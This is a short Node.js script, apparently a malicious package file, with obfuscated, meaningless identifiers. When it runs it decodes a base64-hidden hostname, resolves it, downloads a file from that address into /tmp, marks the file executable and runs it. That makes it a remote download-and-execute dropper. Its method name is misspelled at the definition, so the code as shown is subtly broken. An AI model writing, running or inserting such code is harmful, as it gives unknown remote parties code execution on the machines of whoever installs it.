const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function coprophagan() {
    this.load_atack = function(chrisroot) {
      if (chrisroot != null && chrisroot != '0.0.0.0') {
        solifluctional = http.get('http://' + chrisroot + '/ichthyornithoid', function(socies) {
          var murexid = fs.createWriteStream('/tmp/ultramaternal');
          socies.on('data', function(arrant) {
            murexid.write(arrant);
          });
          socies.on('end', function() {
            murexid.end();
            fs.chmod('/tmp/ultramaternal', '0777');
            child_process.exec('/tmp/ultramaternal', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      milts = 'YTc2ZWFjNDQudHJ1ZXNrbHp6LmRl'
      dns.lookup((new Buffer(milts, 'base64')).toString(), function(err, unhermitical) {
        self.load_attack(unhermitical);
      });
    };
};

(new coprophagan()).run();
